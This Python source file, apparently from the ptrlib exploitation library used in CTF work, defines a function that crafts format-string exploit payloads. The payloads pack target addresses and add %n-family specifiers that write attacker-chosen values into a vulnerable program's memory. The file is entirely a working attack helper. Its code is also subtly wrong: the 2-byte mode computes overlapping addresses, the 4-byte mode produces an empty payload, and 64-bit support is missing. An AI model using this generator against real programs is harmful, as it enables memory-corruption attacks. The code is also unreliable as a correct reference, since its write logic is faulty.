from ptrlib.util.encoding import *
from ptrlib.util.packing import *

def fsb(pos, writes, bs=1, written=0, bits=32):
    """Craft a Format String Exploit payload
    
    Args:
        pos (int)    : The position where your input appears on the stack
        writes (list): A disctionary which has the addresses as keys and the data as values
        bs (int)     : The bytes to write at once (must be 1, 2, 4)
        written (int): The byte length to be written before this payload

    Returns:
        bytes: crafted payload
    """
    assert bs == 1 or bs == 2 or bs == 4
    
    # set prefix
    if bs == 1:
        prefix = "hhn"
    elif bs == 2:
        prefix = "hn"
    else:
        prefix = "n"
        
    # craft payload
    payload = b''
    if bits == 32:
        # 32bit mode
        table = {}
        if bs == 1:
            for addr in writes:
                for i in range(4):
                    table[addr + i] = (writes[addr] >> (i * 8)) & 0xff
        elif bs == 2:
            for addr in writes:
                for i in range(2):
                    table[addr + i] = (writes[addr] >> (i * 16)) & 0xffff
            
        n = written + len(table) * 4
        i = 0
        
        for addr in table:
            payload += p32(addr)
            
        for addr in table:
            if bs == 1:
                l = ((table[addr] - n - 1) & 0xff) + 1
            elif bs == 2:
                l = ((table[addr] - n - 1) & 0xffff) + 1
            elif bs == 4:
                l = ((table[addr] - n - 1) & 0xffffffff) + 1
            payload += str2bytes("%{0}c%{1}${2}".format(
                l, pos + i, prefix
            ))
            n += l
            i += 1
            
    elif bits == 64:
        dump("fsb: Sorry, not implemented yet", "debug")
        
    else:
        dump("fsb: Invalid bits specified", "warning")
        return None
    return payload
